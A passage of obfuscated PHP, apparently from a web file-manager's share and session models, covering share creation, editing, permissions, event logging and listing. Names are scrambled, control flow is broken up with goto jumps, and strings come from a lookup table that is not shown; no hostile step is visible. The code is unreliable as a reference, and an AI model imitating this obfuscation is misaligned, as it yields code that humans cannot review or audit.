$dãÀ‰‰ =& $_SERVER[Ç³Íß¦Ó]; $FÅó¢½Êõ‰ = array($dãÀ‰‰[1813] => $A†šÔĞ«„–, $dãÀ‰‰[1722] => $EËÊŞ¯´, $dãÀ‰‰[1814] => $Fëœ¿Ş»ùµ + time()); if (Session::get($dãÀ‰‰[1815])) { $FÅó¢½Êõ‰[$dãÀ‰‰[1526]] = Session::get($dãÀ‰‰[1815]); } else { $FÅó¢½Êõ‰[$dãÀ‰‰[1526]] = 0; } if ($this->get($A†šÔĞ«„–)) { return $this->where(array($dãÀ‰‰[1813] => $A†šÔĞ«„–))->save($FÅó¢½Êõ‰); } else { return $this->add($FÅó¢½Êõ‰, array(), !0); } } public function remove($AâØ¤ÓíŠ) { return $this->where(array($_SERVER[Ç³Íß¦Ó][1813] => $AâØ¤ÓíŠ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ç³Íß¦Ó][1816] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\x54\x69\x6d\x65", "\164\x69\x6d\145", "\151\x6e\163\x65\162\x74\x2c\x75\160\144\141\164\x65", "\146\165\156\143\164\151\157\x6e"), array("\143\162\x65\141\x74\145\x54\151\155\145", "\x74\151\155\x65", "\x69\156\163\145\x72\x74", "\x66\165\156\x63\x74\x69\157\x6e"), array("\157\160\164\151\x6f\156\163", '', "\151\156\x73\145\162\x74\54\x75\x70\144\x61\164\x65\x2c\163\x65\x6c\x65\143\x74", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($c…æªç²ˆ‘) { $Eö·Ç‰°¸› =& $_SERVER[Ç³Íß¦Ó]; $eÌ°™ãÁâ = isset($c…æªç²ˆ‘[0]) ? $c…æªç²ˆ‘[0] : !1; return array($Eö·Ç‰°¸›[1817] => array(USER_ID, $Eö·Ç‰°¸›[1818]), $Eö·Ç‰°¸›[1761] => array($eÌ°™ãÁâ, $Eö·Ç‰°¸›[1819])); } protected function listSimple() { $AÔ§¢èĞ¤İ = array($_SERVER[Ç³Íß¦Ó][1526] => USER_ID); $BÎõ¶Ì¾ƒ‡ = $this->field($this->fieldList)->where($AÔ§¢èĞ¤İ)->select(); return $BÎõ¶Ì¾ƒ‡ ? $BÎõ¶Ì¾ƒ‡ : array(); } protected function getInfo($DäæÃÓçœ, $C–¹Õä¬¼ = false) { $CÙ´ëŠ»À½ =& $_SERVER[Ç³Íß¦Ó]; if ($C–¹Õä¬¼) { return $this->_getShareInfo(array($CÙ´ëŠ»À½[466] => $DäæÃÓçœ)); } $AéŞ½„« = $this->cacheFunctionGet($CÙ´ëŠ»À½[1768], $DäæÃÓçœ); return $AéŞ½„«; } public function getInfoByHash($FÈ“¶¸’Ò¸) { return $this->_getShareInfo(array($_SERVER[Ç³Íß¦Ó][468] => $FÈ“¶¸’Ò¸)); } public function getInfoByPath($A´›šâÛ§„) { $b©Ôè’ï£ =& $_SERVER[Ç³Íß¦Ó]; $bŒÄó­¯„Œ = array($b©Ôè’ï£[1526] => USER_ID, $b©Ôè’ï£[394] => $A´›šâÛ§„); return $this->_getShareInfo($bŒÄó­¯„Œ); } public function getInfoBySourcePath($cã·‘Â²©) { $d‹‹Ë£³éÃ =& $_SERVER[Ç³Íß¦Ó]; $c®¿Œ«³«  = array($d‹‹Ë£³éÃ[1526] => USER_ID, $d‹‹Ë£³éÃ[1071] => $cã·‘Â²©); return $this->_getShareInfo($c®¿Œ«³« ); } private function _getShareInfo($dĞ‡É­ø) { goto Cáœ¥º£»ˆ; FÀø±–°½: $dĞ‡É­ø = array($C Û©ß•„Á[466] => $A¨¿ë‘†¥…[$C Û©ß•„Á[466]]); $AÃçéøçİŒ = $C Û©ß•„Á[1820]; $aôçÌòåÑô = Model($C Û©ß•„Á[563])->order($C Û©ß•„Á[392])->field($AÃçéøçİŒ)->where($dĞ‡É­ø)->select(); goto F¤ÀÈŠìÈõ; Cáœ¥º£»ˆ: $C Û©ß•„Á =& $_SERVER[Ç³Íß¦Ó]; $A¨¿ë‘†¥… = $this->where($dĞ‡É­ø)->find(); if (!$A¨¿ë‘†¥…) { return !1; } goto FÀø±–°½; F¤ÀÈŠìÈõ: if ($A¨¿ë‘†¥…[$C Û©ß•„Á[394]] == $C Û©ß•„Á[495]) { $A¨¿ë‘†¥…[$C Û©ß•„Á[85]] = IO::info($A¨¿ë‘†¥…[$C Û©ß•„Á[1071]]); } else { $A¨¿ë‘†¥…[$C Û©ß•„Á[85]] = Model($C Û©ß•„Á[1204])->pathInfo($A¨¿ë‘†¥…[$C Û©ß•„Á[394]]); } $A¨¿ë‘†¥…[$C Û©ß•„Á[1821]] = $aôçÌòåÑô; return $A¨¿ë‘†¥…; goto cãµ½Ñ¡Ô„; cãµ½Ñ¡Ô„: } protected function getInfoAuth($F“½ö”¶©É) { $EÙ£ĞÖ­£ =& $_SERVER[Ç³Íß¦Ó]; $dŠ‹§Ş‹ê = $this->getInfo($F“½ö”¶©É); $dŠ‹§Ş‹ê[$EÙ£ĞÖ­£[404]] = Model($EÙ£ĞÖ­£[480])->authMake($dŠ‹§Ş‹ê[$EÙ£ĞÖ­£[1821]]); return $dŠ‹§Ş‹ê; } protected function listData($eàÛíªœË‹ = null, $a²¼Š±Óª = 300) { $a¤÷«®¢êŠ =& $_SERVER[Ç³Íß¦Ó]; $a¥øˆ¾ÈÄ‚ = array(array($a¤÷«®¢êŠ[471] => array($a¤÷«®¢êŠ[969], 0), $a¤÷«®¢êŠ[473] => array($a¤÷«®¢êŠ[969], 0), $a¤÷«®¢êŠ[1822] => $a¤÷«®¢êŠ[1776])); if ($eàÛíªœË‹ == $a¤÷«®¢êŠ[1823]) { $a¥øˆ¾ÈÄ‚ = array($a¤÷«®¢êŠ[471] => 1); } else { if ($eàÛíªœË‹ == $a¤÷«®¢êŠ[1056]) { $a¥øˆ¾ÈÄ‚ = array($a¤÷«®¢êŠ[473] => 1); } } $a¥øˆ¾ÈÄ‚[$a¤÷«®¢êŠ[1526]] = USER_ID; $bÊ›ùÓÒ¤ª = $this->where($a¥øˆ¾ÈÄ‚)->selectPage($a²¼Š±Óª); return $bÊ›ùÓÒ¤ª; } protected function listToMe($Bš ßÖ…Îº = 300) { goto eÚ­£Šø»Ï; eÚ­£Šø»Ï: $E…¹™Ø•Ë• =& $_SERVER[Ç³Íß¦Ó]; $Bì‰å‘§†¢ = Model($E…¹™Ø•Ë•[1824])->userGroupParents(USER_ID); $B¨Ìç÷‹„– = array($E…¹™Ø•Ë•[548] => SourceModel::TYPE_USER, $E…¹™Ø•Ë•[482] => USER_ID); goto aÊÑƒˆ¡µ; bóƒË½í—¢: $DêùÜ²©º’ = $this->field($b–…¹‚óÛä)->where($B¨Ìç÷‹„–)->select(); foreach ($DêùÜ²©º’ as $EƒÛçŒàó¬ => &$EãÇ¯‡ƒğ”) { $EãÇ¯‡ƒğ”[$E…¹™Ø•Ë•[1821]] = $CÄˆ®†½É[$EãÇ¯‡ƒğ”[$E…¹™Ø•Ë•[466]]]; } unset($EãÇ¯‡ƒğ”); goto cÙ³¨‹»Ã; aÊÑƒˆ¡µ: if ($Bì‰å‘§†¢) { $B¨Ìç÷‹„– = array(array($E…¹™Ø•Ë•[548] => SourceModel::TYPE_USER, $E…¹™Ø•Ë•[482] => USER_ID), array($E…¹™Ø•Ë•[548] => SourceModel::TYPE_GROUP, $E…¹™Ø•Ë•[482] => array($E…¹™Ø•Ë•[7], $Bì‰å‘§†¢)), $E…¹™Ø•Ë•[1822] => $E…¹™Ø•Ë•[1776]); } $e‹Â•ˆö¿‘ = Model($E…¹™Ø•Ë•[563])->where($B¨Ìç÷‹„–)->selectPage($Bš ßÖ…Îº); $CÄˆ®†½É = array_to_keyvalue_group($e‹Â•ˆö¿‘[$E…¹™Ø•Ë•[366]], $E…¹™Ø•Ë•[466]); goto Bğœî‹ô¦à; Bğœî‹ô¦à: if (!$CÄˆ®†½É) { return $e‹Â•ˆö¿‘; } $b–…¹‚óÛä = $E…¹™Ø•Ë•[1825]; $B¨Ìç÷‹„– = array($E…¹™Ø•Ë•[466] => array($E…¹™Ø•Ë•[409], array_keys($CÄˆ®†½É))); goto bóƒË½í—¢; cÙ³¨‹»Ã: $Aø•„„¹ = array($E…¹™Ø•Ë•[1826] => $DêùÜ²©º’, $E…¹™Ø•Ë•[1827] => $e‹Â•ˆö¿‘[$E…¹™Ø•Ë•[363]]); return $Aø•„„¹; goto eìó‚•çÊ; eìó‚•çÊ: } protected function shareAdd($Bä³ÕÍ‰¸‘, $dá‡Í­¶) { $AÒ¬•˜ëà =& $_SERVER[Ç³Íß¦Ó]; $fÏ¤×Ş„ = $this->_addShareData($Bä³ÕÍ‰¸‘, $dá‡Í­¶); if (!empty($dá‡Í­¶[$AÒ¬•˜ëà[1828]])) { $this->_shareAuthSet($fÏ¤×Ş„, $dá‡Í­¶[$AÒ¬•˜ëà[1828]]); } $this->shareEventAdd($Bä³ÕÍ‰¸‘, $dá‡Í­¶, $AÒ¬•˜ëà[1059]); return $fÏ¤×Ş„; } private function shareEventAdd($BÛÂ‚²¸Î, $B¹ìã†»í½, $BôôŠŒÈ = "\x61\144\144") { goto b‚óÍİóÚ£; eö¯ĞÃË°: $eõŠ¢Î–ŒÔ = $this->getInfoByPath($BÛÂ‚²¸Î); $fïˆ„½¢ã = $B —À¥“é[1831]; if ($eõŠ¢Î–ŒÔ[$B —À¥“é[471]] == $B —À¥“é[495] && $B¹ìã†»í½[$B —À¥“é[471]] == $B —À¥“é[87]) { $fïˆ„½¢ã = $B —À¥“é[1829]; } goto fè‡„°ÛÃì; fè‡„°ÛÃì: if ($eõŠ¢Î–ŒÔ[$B —À¥“é[471]] == $B —À¥“é[87] && $B¹ìã†»í½[$B —À¥“é[471]] == $B —À¥“é[495]) { $fïˆ„½¢ã = $B —À¥“é[1832]; } if ($eõŠ¢Î–ŒÔ[$B —À¥“é[473]] == $B —À¥“é[495] && $B¹ìã†»í½[$B —À¥“é[473]] == $B —À¥“é[87]) { $fïˆ„½¢ã = $B —À¥“é[1830]; } if ($eõŠ¢Î–ŒÔ[$B —À¥“é[473]] == $B —À¥“é[87] && $B¹ìã†»í½[$B —À¥“é[473]] == $B —À¥“é[495]) { $fïˆ„½¢ã = $B —À¥“é[1833]; } goto eÊÌ†¤™Ò; b‚óÍİóÚ£: $B —À¥“é =& $_SERVER[Ç³Íß¦Ó]; if (!$BÛÂ‚²¸Î || $BÛÂ‚²¸Î == $B —À¥“é[495]) { return; } if ($BôôŠŒÈ == $B —À¥“é[1059]) { if ($B¹ìã†»í½[$B —À¥“é[471]] == $B —À¥“é[87]) { Model($B —À¥“é[532])->eventShare($BÛÂ‚²¸Î, $B —À¥“é[1829]); } if ($B¹ìã†»í½[$B —À¥“é[473]] == $B —À¥“é[87]) { Model($B —À¥“é[532])->eventShare($BÛÂ‚²¸Î, $B —À¥“é[1830]); } return; } goto eö¯ĞÃË°; eÊÌ†¤™Ò: Model($B —À¥“é[532])->eventShare($BÛÂ‚²¸Î, $fïˆ„½¢ã); return; goto Eî÷ÚÑõì¹; Eî÷ÚÑõì¹: } private function _addShareData($EñÖ°çöÊ, $EÕš˜ƒ…˜ = array()) { goto DÎ˜¶–Ü¨³; DÎ˜¶–Ü¨³: $eØ„éÇöÑÒ =& $_SERVER[Ç³Íß¦Ó]; $dóŠ¿ªëŸŒ = array($eØ„éÇöÑÒ[408] => $EñÖ°çöÊ, $eØ„éÇöÑÒ[1518] => USER_ID); if ($EñÖ°çöÊ == 0) { $dóŠ¿ªëŸŒ = array($eØ„éÇöÑÒ[1834] => $EÕš˜ƒ…˜[$eØ„éÇöÑÒ[1071]], $eØ„éÇöÑÒ[1518] => USER_ID); } goto CÍæËåŸ˜·; F¢êîÃ¼î: $CÛ¤Š„¢óÜ = $this->add($Bõ¸ØëÓ·±); $bÇ–ŸÒÓ = array($eØ„éÇöÑÒ[468] => short_id($CÛ¤Š„¢óÜ)); $this->where(array($eØ„éÇöÑÒ[465] => $CÛ¤Š„¢óÜ))->save($bÇ–ŸÒÓ); goto c¨Â­¬Ô¾Ã; DëÀÖè¥í: $Bõ¸ØëÓ·± = array($eØ„éÇöÑÒ[1518] => USER_ID, $eØ„éÇöÑÒ[408] => $EñÖ°çöÊ, $eØ„éÇöÑÒ[1432] => $eØ„éÇöÑÒ[33], $eØ„éÇöÑÒ[471] => 0, $eØ„éÇöÑÒ[473] => 0, $eØ„éÇöÑÒ[1071] => $eØ„éÇöÑÒ[33], $eØ„éÇöÑÒ[304] => $eØ„éÇöÑÒ[33], $eØ„éÇöÑÒ[849] => $eØ„éÇöÑÒ[33], $eØ„éÇöÑÒ[1835] => 0, $eØ„éÇöÑÒ[1836] => 0, $eØ„éÇöÑÒ[474] => 0, $eØ„éÇöÑÒ[475] => $eØ„éÇöÑÒ[33], $eØ„éÇöÑÒ[468] => $eØ„éÇöÑÒ[33]); $E³·“ª„œÌ = explode($eØ„éÇöÑÒ[47], $eØ„éÇöÑÒ[1837]); foreach ($E³·“ª„œÌ as $Bƒã¿Ë¯í) { if (!isset($EÕš˜ƒ…˜[$Bƒã¿Ë¯í])) { continue; } $Bõ¸ØëÓ·±[$Bƒã¿Ë¯í] = $EÕš˜ƒ…˜[$Bƒã¿Ë¯í]; } goto F¢êîÃ¼î; CÍæËåŸ˜·: if ($dœåë‰¤ƒÇ = $this->where($dóŠ¿ªëŸŒ)->find()) { return $dœåë‰¤ƒÇ[$eØ„éÇöÑÒ[466]]; } if ($EñÖ°çöÊ == 0) { $dÅ½ÂŒ±…È = array($eØ„éÇöÑÒ[28] => get_path_this($EÕš˜ƒ…˜[$eØ„éÇöÑÒ[76]])); } else { $dÅ½ÂŒ±…È = Model($eØ„éÇöÑÒ[791])->sourceInfo($EñÖ°çöÊ); if (!$dÅ½ÂŒ±…È) { return !1; } } if (!$EÕš˜ƒ…˜[$eØ„éÇöÑÒ[1432]]) { $EÕš˜ƒ…˜[$eØ„éÇöÑÒ[1432]] = $dÅ½ÂŒ±…È[$eØ„éÇöÑÒ[28]]; } goto DëÀÖè¥í; c¨Â­¬Ô¾Ã: return $CÛ¤Š„¢óÜ; goto Cà¾Ï¼ø†ƒ; Cà¾Ï¼ø†ƒ: } private function _shareAuthSet($eÜ›ìÌµó–, $c‰¾‘ºÊØµ) { goto aŠ¼¤‰ö›Æ; aŠ¼¤‰ö›Æ: $A¹ÒÆæÊ =& $_SERVER[Ç³Íß¦Ó]; if (!is_array($c‰¾‘ºÊØµ)) { return !1; } $a™Ùò†æç = Model($A¹ÒÆæÊ[1788]); goto D«âïÈĞ; D«âïÈĞ: $a™Ùò†æç->where(array($A¹ÒÆæÊ[466] => $eÜ›ìÌµó–))->delete(); $a–²ä¶î¬¦ = array(); foreach ($c‰¾‘ºÊØµ as $fÊÏ”µñä¯) { $f³Š°¬ç¯ = SourceModel::TYPE_USER; if ($fÊÏ”µñä¯[$A¹ÒÆæÊ[402]] == SourceModel::TYPE_GROUP) { $f³Š°¬ç¯ = SourceModel::TYPE_GROUP; } $DÍèÊìõÆ = array($A¹ÒÆæÊ[466] => $eÜ›ìÌµó–, $A¹ÒÆæÊ[402] => $f³Š°¬ç¯, $A¹ÒÆæÊ[482] => intval($fÊÏ”µñä¯[$A¹ÒÆæÊ[482]]), $A¹ÒÆæÊ[1784] => 0, $A¹ÒÆæÊ[1838] => -1); if ($fÊÏ”µñä¯[$A¹ÒÆæÊ[1784]]) { $DÍèÊìõÆ[$A¹ÒÆæÊ[1784]] = $fÊÏ”µñä¯[$A¹ÒÆæÊ[1784]]; } else { if ($fÊÏ”µñä¯[$A¹ÒÆæÊ[1838]]) { $DÍèÊìõÆ[$A¹ÒÆæÊ[1838]] = $fÊÏ”µñä¯[$A¹ÒÆæÊ[1838]]; } } $a–²ä¶î¬¦[] = $DÍèÊìõÆ; } goto F¿ìÁ¬Ğ ; F¿ìÁ¬Ğ : return $a™Ùò†æç->addAll($a–²ä¶î¬¦, array(), !0); goto B¤à¨ÌÙîÎ; B¤à¨ÌÙîÎ: } public function numViewAdd($FÃ•ëÉ·†) { $EÖäôê™é =& $_SERVER[Ç³Íß¦Ó]; $D®‡çÃøÚÚ = array($EÖäôê™é[465] => $FÃ•ëÉ·†); $this->where($D®‡çÃøÚÚ)->setAdd($EÖäôê™é[1835]); } public function numDownloadAdd($EâöİÙ¨ì) { $fƒœ‡¹‰‡ˆ =& $_SERVER[Ç³Íß¦Ó]; $ağ…ÄĞæ‰ = array($fƒœ‡¹‰‡ˆ[465] => $EâöİÙ¨ì); $this->where($ağ…ÄĞæ‰)->setAdd($fƒœ‡¹‰‡ˆ[1836]); } protected function shareEdit($fÎ‰ìºöÂØ, $aªòÍİÒÛÄ) { goto eÙëí˜ö»µ; eÙëí˜ö»µ: $Aî··Ìµ =& $_SERVER[Ç³Íß¦Ó]; $bâäîŒ²‚ = $this->getInfo($fÎ‰ìºöÂØ); if (!$bâäîŒ²‚) { return !1; } goto dëÓØ©…÷; cˆËŠß¬§: foreach ($Bß‚®›¥„ as $fè±Åöà‚â) { if (!array_key_exists($fè±Åöà‚â, $aªòÍİÒÛÄ)) { continue; } $b¸ó…Ë”Óè[$fè±Åöà‚â] = $aªòÍİÒÛÄ[$fè±Åöà‚â]; } $this->shareEventAdd($bâäîŒ²‚[$Aî··Ìµ[394]], $aªòÍİÒÛÄ, $Aî··Ìµ[1656]); $this->where(array($Aî··Ìµ[465] => $fÎ‰ìºöÂØ))->save($b¸ó…Ë”Óè); goto A’¸ªéÒ„; A’¸ªéÒ„: if (isset($aªòÍİÒÛÄ[$Aî··Ìµ[1828]])) { $this->_shareAuthSet($fÎ‰ìºöÂØ, $aªòÍİÒÛÄ[$Aî··Ìµ[1828]]); } return !0; goto aÚ‡èáÔ«ƒ; dëÓØ©…÷: $this->_checkLinkShare($aªòÍİÒÛÄ, $bâäîŒ²‚); $b¸ó…Ë”Óè = array(); $Bß‚®›¥„ = explode($Aî··Ìµ[47], $Aî··Ìµ[1839]); goto cˆËŠß¬§; aÚ‡èáÔ«ƒ: } private function _checkLinkShare($bŸ²“æ‚Â, $a”±œ‹âì) { goto a©éœÖ‘‘Ñ; AÒâêŒƒŒ×: if ($a”±œ‹âì[$b¡Ö¨¿Ü‰–[85]][$b¡Ö¨¿Ü‰–[29]] != $b¡Ö¨¿Ü‰–[192]) { $cµèÁ‰· = $this->_folderReport($f„·ÓÒ¡ëõ); if (!$cµèÁ‰·) { return; } show_json(LNG($b¡Ö¨¿Ü‰–[1840]) . $b¡Ö¨¿Ü‰–[1841] . $cµèÁ‰·, !1); } $B„ç÷í¡‹õ = Model($b¡Ö¨¿Ü‰–[791])->fileInfoGet($a”±œ‹âì[$b¡Ö¨¿Ü‰–[85]][$b¡Ö¨¿Ü‰–[394]]); if (!$B„ç÷í¡‹õ) { return; } goto A¦ÍÀçÙ·; A¦ÍÀçÙ·: $aÂ˜øØè®Ø = $this->shareFileMeta($B„ç÷í¡‹õ[$b¡Ö¨¿Ü‰–[445]]); if (isset($aÂ˜øØè®Ø[$b¡Ö¨¿Ü‰–[371]]) && $aÂ˜øØè®Ø[$b¡Ö¨¿Ü‰–[371]] == $b¡Ö¨¿Ü‰–[87]) { show_json(LNG($b¡Ö¨¿Ü‰–[1842]), !1); } goto DÚ–×ƒßÑÇ; a©éœÖ‘‘Ñ: $b¡Ö¨¿Ü‰– =& $_SERVER[Ç³Íß¦Ó]; if ($bŸ²“æ‚Â[$b¡Ö¨¿Ü‰–[471]] != $b¡Ö¨¿Ü‰–[87]) { return; } $f„·ÓÒ¡ëõ = $a”±œ‹âì[$b¡Ö¨¿Ü‰–[85]][$b¡Ö¨¿Ü‰–[394]]; goto AÒâêŒƒŒ×; DÚ–×ƒßÑÇ: } private function _folderReport($c¬›ê¸·•) { goto F‡‰ÊÒ·‘­; a¸Æó‚¥ÓŸ: $B›Î­…Šä = array_to_keyvalue($c¦ÍŠ•øƒ, $bßÒÓ°ÉÅ[33], $bßÒÓ°ÉÅ[28]); $B›Î­…Šä[] = $d¡ƒŸÃ—œ[$bßÒÓ°ÉÅ[28]]; return implode($bßÒÓ°ÉÅ[8], $B›Î­…Šä); goto DöŒ¹„×¾¯; F‡‰ÊÒ·‘­: $bßÒÓ°ÉÅ =& $_SERVER[Ç³Íß¦Ó]; $a¡‚¥¡ĞÉÆ = array($bßÒÓ°ÉÅ[445] => array($bßÒÓ°ÉÅ[969], 0), $bßÒÓ°ÉÅ[714] => 3); $D§µ‹‘•âÌ = Model($bßÒÓ°ÉÅ[1843])->where($a¡‚¥¡ĞÉÆ)->field($bßÒÓ°ÉÅ[445])->select(); goto fÚ‡êù•‚; fÚ‡êù•‚: if (!$D§µ‹‘•âÌ) { return !1; } $D§µ‹‘•âÌ = array_to_keyvalue($D§µ‹‘•âÌ, $bßÒÓ°ÉÅ[33], $bßÒÓ°ÉÅ[445]); $F–³š³ÃÔÓ = $bßÒÓ°ÉÅ[47] . $c¬›ê¸·• . $bßÒÓ°ÉÅ[47]; goto F¤ÄÅ‘áè¡; F¤ÄÅ‘áè¡: $a¡‚¥¡ĞÉÆ = array($bßÒÓ°ÉÅ[445] => array($bßÒÓ°ÉÅ[7], $D§µ‹‘•âÌ), $bßÒÓ°ÉÅ[485] => array($bßÒÓ°ÉÅ[379], "\x25{$F–³š³ÃÔÓ}\45"), $bßÒÓ°ÉÅ[421] => 0); $d¡ƒŸÃ—œ = Model($bßÒÓ°ÉÅ[791])->where($a¡‚¥¡ĞÉÆ)->field($bßÒÓ°ÉÅ[1844])->find(); if (!$d¡ƒŸÃ—œ) { return !1; } goto Då£óë‹ñÊ; Då£óë‹ñÊ: $E‹ÃÙæõĞ³ = substr($d¡ƒŸÃ—œ[$bßÒÓ°ÉÅ[485]], strpos($d¡ƒŸÃ—œ[$bßÒÓ°ÉÅ[485]], $F–³š³ÃÔÓ)); $a¡‚¥¡ĞÉÆ = array($bßÒÓ°ÉÅ[394] => array($bßÒÓ°ÉÅ[7], trim($E‹ÃÙæõĞ³, $bßÒÓ°ÉÅ[47]))); $c¦ÍŠ•øƒ = Model($bßÒÓ°ÉÅ[791])->where($a¡‚¥¡ĞÉÆ)->field($bßÒÓ°ÉÅ[28])->select(); goto a¸Æó‚¥ÓŸ; DöŒ¹„×¾¯: } protected function remove($FÄîÊ¼À’å) { goto c¸©Ÿ˜ë¨â; c¸©Ÿ˜ë¨â: $eª¯æÕ²§½ =& $_SERVER[Ç³Íß¦Ó]; if (is_array($FÄîÊ¼À’å)) { $FÄîÊ¼À’å = array($eª¯æÕ²§½[7], $FÄîÊ¼À’å); } $Aá¸…ÈÅ Ç = array($eª¯æÕ²§½[466] => $FÄîÊ¼À’å); goto D°õ‚§Ñëº; D°õ‚§Ñëº: $B”Ôƒã¦ƒ½ = $this->where($Aá¸…ÈÅ Ç)->delete(); if ($B”Ôƒã¦ƒ½) { Model($eª¯æÕ²§½[563])->where(array($eª¯æÕ²§½[466] => $FÄîÊ¼À’å))->delete(); } $bóŞµ£ìµ› = is_array($FÄîÊ¼À’å) ? $FÄîÊ¼À’å[1] : array($FÄîÊ¼À’å); goto bÖøø…º¥¾; bÖøø…º¥¾: for ($aëì…Ï½¦Â = 0; $aëì…Ï½¦Â < count($bóŞµ£ìµ›); $aëì…Ï½¦Â++) { $F©éâËæä‘ = $this->getInfo($bóŞµ£ìµ›[$aëì…Ï½¦Â]); if ($F©éâËæä‘[$eª¯æÕ²§½[473]] == $eª¯æÕ²§½[87]) { Model($eª¯æÕ²§½[532])->eventShare($F©éâËæä‘[$eª¯æÕ²§½[394]], $eª¯æÕ²§½[1833]); } if ($F©éâËæä‘[$eª¯æÕ²§½[471]] == $eª¯æÕ²§½[87]) { Model($eª¯æÕ²§½[532])->eventShare($F©éâËæä‘[$eª¯æÕ²§½[394]], $eª¯æÕ²§½[1832]); } } return $B”Ôƒã¦ƒ½; goto B¢“êÑ®ÔÒ; B¢“êÑ®ÔÒ: } protected function removeBySource($cË‰èÖÒµ¥) { goto DºŒ”…ï–¥; DºŒ”…ï–¥: $d¨Ú©‚Ö =& $_SERVER[Ç³Íß¦Ó]; $AˆĞÆ°ˆ = array($d¨Ú©‚Ö[408] => array($d¨Ú©‚Ö[409], $cË‰èÖÒµ¥)); $B¿‰Šàˆ„Ö = $this->field($d¨Ú©‚Ö[466])->where($AˆĞÆ°ˆ)->select(); goto CêÏ¸¶óÖí; b‹×ò Æê¼: $this->where($AˆĞÆ°ˆ)->delete(); Model($d¨Ú©‚Ö[563])->where($AˆĞÆ°ˆ)->delete(); goto e‰Æ“ß•©‡; CêÏ¸¶óÖí: $B¿‰Šàˆ„Ö = array_to_keyvalue($B¿‰Šàˆ„Ö, $d¨Ú©‚Ö[33], $d¨Ú©‚Ö[466]); if (!$B¿‰Šàˆ„Ö) { return; } $AˆĞÆ°ˆ = array($d¨Ú©‚Ö[465] => array($d¨Ú©‚Ö[409], $B¿‰Šàˆ„Ö)); goto b‹×ò Æê¼; e‰Æ“ß•©‡: } public function listAll($bŒ÷ŞÖøà) { goto e‡»±Œö; EáßôºäÈ: $A¼ê…¡î¨ = $this->_makeOrder()->where($E†òò¯‰Õ¨)->selectPage(20); if (empty($A¼ê…¡î¨[$cå‰ìêº¹Ğ[366]])) { return array(); } $this->_listDataApply($A¼ê…¡î¨[$cå‰ìêº¹Ğ[366]]); goto E°÷‚¼–Ğª; e‡»±Œö: $cå‰ìêº¹Ğ =& $_SERVER[Ç³Íß¦Ó]; $E†òò¯‰Õ¨ = array(); if ($bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[1526]]) { $E†òò¯‰Õ¨[$cå‰ìêº¹Ğ[1526]] = $bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[1526]]; } goto aö©‹¦à­; E°÷‚¼–Ğª: return $A¼ê…¡î¨; goto FãôÔ”ñá¶; aö©‹¦à­: if ($bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[722]]) { $b¡ò‰¢½ï¶ = $bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[474]] ? $bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[474]] : strtotime(date($cå‰ìêº¹Ğ[1845])); $E†òò¯‰Õ¨[$cå‰ìêº¹Ğ[193]] = array($cå‰ìêº¹Ğ[330], array($bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[722]], $b¡ò‰¢½ï¶)); } if ($bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[29]]) { $E†òò¯‰Õ¨[$bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[29]]] = 1; } else { $E†òò¯‰Õ¨[] = array($cå‰ìêº¹Ğ[471] => array($cå‰ìêº¹Ğ[969], 0), $cå‰ìêº¹Ğ[473] => array($cå‰ìêº¹Ğ[969], 0), $cå‰ìêº¹Ğ[1822] => $cå‰ìêº¹Ğ[1776]); } if ($bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[1772]]) { $E†òò¯‰Õ¨[] = array($cå‰ìêº¹Ğ[468] => $bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[1772]], $cå‰ìêº¹Ğ[1432] => array($cå‰ìêº¹Ğ[379], "\45{$bŒ÷ŞÖøà[$cå‰ìêº¹Ğ[1772]]}\x25"), $cå‰ìêº¹Ğ[1822] => $cå‰ìêº¹Ğ[1776]); } goto EáßôºäÈ; FãôÔ”ñá¶: } public function listDataApply($DÀÜœ”§”) { $this->_listDataApply($DÀÜœ”§”); return $DÀÜœ”§”; } private function _listDataApply(&$cÉÅ—‚äö¯) { goto EÇŞ°îÅö; cƒç–§Õ²: $D½Îóõ©Øé = array_to_keyvalue($cÉÅ—‚äö¯, $aãö¢‰Í Ú[33], $aãö¢‰Í Ú[394]); $EĞÙ¼ ½Š‰ = Model($aãö¢‰Í Ú[791])->sourceListInfo($D½Îóõ©Øé, !0); foreach ($cÉÅ—‚äö¯ as $añòÇ´²Ôé => &$Cãù™±Î‚é) { $Cê—Ç§æÈŠ = $Cãù™±Î‚é[$aãö¢‰Í Ú[1526]]; $Cãù™±Î‚é[$aãö¢‰Í Ú[1846]] = $FÄÙ£ßé‹ƒ[$Cê—Ç§æÈŠ] ? $FÄÙ£ßé‹ƒ[$Cê—Ç§æÈŠ] : !1; $a„ƒîÇÕ‹õ = $Cãù™±Î‚é[$aãö¢‰Í Ú[394]]; $Cãù™±Î‚é[$aãö¢‰Í Ú[85]] = $EĞÙ¼ ½Š‰[$a„ƒîÇÕ‹õ] ? $EĞÙ¼ ½Š‰[$a„ƒîÇÕ‹õ] : !1; if ($Cãù™±Î‚é[$aãö¢‰Í Ú[85]][$aãö¢‰Í Ú[421]] == $aãö¢‰Í Ú[87]) { unset($cÉÅ—‚äö¯[$añòÇ´²Ôé]); } if ($Cãù™±Î‚é[$aãö¢‰Í Ú[85]] != $aãö¢‰Í Ú[495] && !$Cãù™±Î‚é[$aãö¢‰Í Ú[85]]) { unset($cÉÅ—‚äö¯[$añòÇ´²Ôé]); } } goto açŠ†Š¼ø«; açŠ†Š¼ø«: unset($Cãù™±Î‚é); $cÉÅ—‚äö¯ = array_values($cÉÅ—‚äö¯); goto E‡÷ËÎßõø; EÇŞ°îÅö: $aãö¢‰Í Ú =& $_SERVER[Ç³Íß¦Ó]; $bØõ’â£Ë = array_to_keyvalue($cÉÅ—‚äö¯, $aãö¢‰Í Ú[33], $aãö¢‰Í Ú[1526]); $FÄÙ£ßé‹ƒ = Model($aãö¢‰Í Ú[505])->userListInfo(array_unique($bØõ’â£Ë)); goto cƒç–§Õ²; E‡÷ËÎßõø: } private function _makeOrder($DÖØ¼…âœ = '') { goto fÄéÂÚß¼¨; 